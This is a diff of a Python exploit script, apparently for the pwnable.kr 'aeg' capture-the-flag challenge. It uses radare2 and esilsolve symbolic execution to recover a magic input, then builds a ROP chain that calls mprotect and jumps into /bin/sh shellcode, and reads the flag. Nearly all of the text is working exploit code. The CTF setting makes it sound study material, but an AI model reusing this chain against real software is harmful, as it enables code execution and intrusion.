@@ -7,22 +7,18 @@ from esilsolve import ESILSolver
 import esilsolve.solver as solver
 
 from subprocess import check_output
-import sys
-import re
 import time
-
 from pwn import *
 import r2pipe
 
-context.arch='amd64'
+context.arch = 'amd64'
 
 path = "./aeg_program"
 r2p = None
 
-b = None
-
 def esilsolve_execution(targets):
     log.info("Starting esilsolve execution...")
+    start = time.time()
 
     r2p.cmd("s %d; aei; aeim;" % targets["check_start"])
     esilsolver = ESILSolver(r2p, debug=False, trace=False)
@@ -31,6 +27,7 @@ def esilsolve_execution(targets):
     buf_addr = targets["buf_addr"]
     buf_len = 48
     b = [solver.BitVec("b%d" % x, 8) for x in range(buf_len)]
+
     buf = solver.Concat(*b)
 
     state.memory.write_bv(buf_addr, buf, buf_len)
@@ -39,31 +36,39 @@ def esilsolve_execution(targets):
         # never take jumps for failed solutions
         newstate.solver.add(newstate.registers["zf"] == 1) 
 
-    for jne_addr in targets["jnes"]:
-        esilsolver.register_hook(jne_addr, constrain_jump)
+    #for jne_addr in targets["jnes"]:
+    #    esilsolver.register_hook(jne_addr, constrain_jump)
 
-    final = esilsolver.run(targets["goal"])
+    final = esilsolver.run(targets["goal"], avoid=[targets["check_start"]+39])
     
     if final.solver.check() == solver.sat:
         m = final.solver.model()
-        c = m.eval(buf)
+        c = m.eval(buf, True)
+
+        end = time.time()
+        log.info("EXEC TIME: %f" % (end-start))
 
         magic = list(solver.BV2Bytes(c))
         return magic
     else:
         return []
 
-def generate_exploit(magic, addr, last_mov, xors):
+def generate_exploit(magic, targets, elf):
+
+    addr = targets["buf_addr"]
+    last_mov = targets["last_mov"]
+    xors = targets["xors"]
+
     log.info('Crafting final exploit')
 
-    r = ROP(b)
+    r = ROP(elf)
     shellcode = asm(shellcraft.amd64.sh())
     
     ret = r.find_gadget(["ret"])
     pop_rdi = r.find_gadget(["pop rdi", "ret"])
     pop_rbp = r.find_gadget(["pop rbp", "ret"])
     pop_rsi = r.find_gadget(["pop rsi", "pop r15", "ret"])
-    
+
     page_size = 2**12
     mask = page_size - 1
     
@@ -80,14 +85,19 @@ def generate_exploit(magic, addr, last_mov, xors):
         p64(pop_rsi.address) + 
         p64(0x1000) + 
         b"JUNKJUNK" + 
-        p64(b.symbols[b"mprotect"]) + 
+        p64(targets["mprotect"]) + 
         p64(addr+48+48+97*8+32) + 
         b"\x90"*64 + # nop sled
         shellcode
     )
     
     #print input.values() + magic
-    exploit = format_input(magic + list(exp_str), xors)
+    #exploit = format_input(magic + list(exp_str), xors)
+    exp = magic + list(exp_str)
+    exploit = ""
+    for i in range(len(exp)):
+        exploit += "%02x" % (exp[i] ^ (xors[i % 2] & 0xff)) 
+
     return exploit
 
 def download_program(f):
@@ -110,11 +120,8 @@ def download_program(f):
 
     #f.close()
 
-# parse objdump to get necessary info
-# not sexy but its overkill to do anything else
-# nevermind i need some beter static analysis
 def parse_disassembly():
-
+    r2p.cmd("aaa")
     main_instrs = r2p.cmdj("s main; pdfj")
 
     r2xors = []
@@ -125,8 +132,6 @@ def parse_disassembly():
     for instr in main_instrs["ops"]:
         if "xor eax" in instr["disasm"]:
             r2xors.append(int(instr["disasm"][9:], 16))
-        elif "cmp dword [var_24h]" in instr["disasm"]:
-            r2cmp = instr["offset"]
         elif "movzx eax, byte [0x" in instr["disasm"]:
             if r2start == 0:
                 r2start = instr["offset"]
@@ -135,7 +140,7 @@ def parse_disassembly():
 
     r2jnes = [x["addr"] for x in r2p.cmdj("/amj jne")]
     r2goal = r2p.cmdj("axtj sym.imp.memcpy")[0]["from"]
-    r2puts = r2p.cmdj("axtj sym.imp.puts")[0]["from"]
+    r2mprotect = r2p.cmdj("pdj 1 @ sym.imp.mprotect")[0]["offset"]
     r2movs = [x["addr"] for x in r2p.cmdj("/amj movzx edx, byte") if "- 4" in x["opstr"]]
 
     last_mov = 0
@@ -155,27 +160,16 @@ def parse_disassembly():
             break
 
     r2targets = {
-        "cmp_start": r2cmp,
         "check_start": r2start,
-        "print": r2puts,
         "buf_addr": r2buf,
         "goal": r2goal,
         "xors": r2xors,
         "jnes": r2jnes[:-1],
-        "last_mov": last_mov
+        "last_mov": last_mov,
+        "mprotect": r2mprotect
     }
 
     return r2targets
-
-def format_input(input, xors):
-    res = ''
-    
-    count = 0
-    for i in input:
-        res += "%02x" % (i ^ (xors[count % 2] & 0xff)) 
-        count += 1
-        
-    return res
 
 if __name__ == "__main__":
     #f = remote("pwnable.kr", 9005)
@@ -183,24 +177,26 @@ if __name__ == "__main__":
     #f.close()
 
     r2p = r2pipe.open(path, flags=["-2"])
-    r2p.cmd("aaa")
-    b = ELF(path)
+    elf = ELF(path)
 
     targets = parse_disassembly()
     log.info("BUFFER ADDR: 0x%016x" % targets["buf_addr"])
 
     magic = esilsolve_execution(targets)
     log.info("MAGIC: %s" % magic)
-    exploit = generate_exploit(magic, targets["buf_addr"], targets["last_mov"], targets["xors"])
+
+    exploit = generate_exploit(magic, targets, elf)
     log.info("EXPLOIT: %s" % exploit)
 
     x = process([path, exploit])
     x.read()
-    time.sleep(0.5)
+    #time.sleep(0.1)
     x.writeline("cat flag")
     log.info("FLAG: %s" % x.read().decode())
 
     '''f.read()
     f.writeline(exploit)
-    f.interactive()
+    f.writeline("cat flag")
+    log.info("FLAG: %s" % f.read().decode())
+    #f.interactive()
     f.close()'''
